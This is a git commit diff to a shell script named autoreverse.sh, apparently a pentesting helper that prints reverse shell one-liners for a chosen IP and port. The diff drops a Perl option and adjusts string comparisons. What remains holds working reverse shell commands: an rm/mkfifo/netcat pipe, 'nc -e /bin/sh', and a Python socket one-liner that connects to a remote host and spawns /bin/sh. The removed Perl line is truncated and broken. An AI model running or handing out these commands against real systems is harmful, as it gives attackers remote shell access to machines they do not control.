3eb018b22787f5b8a01d2ae37c57dbb58b3054b1
CronoX1 <91015518+CronoX1@users.noreply.github.com>
2021-10-03 23:24:18 +0200

    Update autoreverse.sh

--- autoreverse.sh
+++ autoreverse.sh
@@ -16,7 +16,7 @@ echo ""
 #PentestMonkey Reverse Shell Options
 
 
-echo -ne "Which type of reverse shell do you want to use? (rm, bash, nc, python or perl): " && read reverse
+echo -ne "Which type of reverse shell command line do you want to use? (rm, bash, nc or python): " && read reverse
 
 rm="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
 
@@ -26,33 +26,26 @@ nc="nc -e /bin/sh $IP $PORT"
 
 python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
 
-perl="perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,"
-
 
 #Display of the reverse shell
 
 
-if [ "$reverse" == "rm" ]; then
+if [ "$reverse" = "rm" ]; then
 echo ""
 echo $rm
 fi
 
-if [ "$reverse" == "bash" ]; then
+if [ "$reverse" = "bash" ]; then
 echo ""
 echo $bash
 fi
 
-if [ "$reverse" == "nc" ]; then
+if [ "$reverse" = "nc" ]; then
 echo ""
 echo $nc
 fi
 
-if [ "$reverse" == "python" ]; then
+if [ "$reverse" = "python" ]; then
 echo ""
 echo $python
-fi
-
-if [ "$reverse" == "perl" ]; then
-echo ""
-echo $perl
 fi
